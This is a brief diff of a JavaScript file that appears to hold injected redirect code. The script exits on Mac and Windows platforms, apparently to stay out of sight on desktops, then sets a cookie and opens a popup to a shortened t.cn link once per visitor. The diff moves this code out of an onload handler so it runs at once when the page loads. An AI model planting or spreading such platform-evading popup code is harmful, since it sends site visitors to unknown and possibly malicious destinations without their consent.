@@ -1,12 +1,12 @@
 if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
     throw SyntaxError();
 }
-window.onload = function(){
+
     if (!getCookie('cc_cookie')) {
         setCookie('cc_cookie','ok',1);
         window.open("http://t.cn/EGwS68r");
      }
-}
+
 function getCookie(cname) {
     var name = cname + "=";
     var ca = document.cookie.split(';');
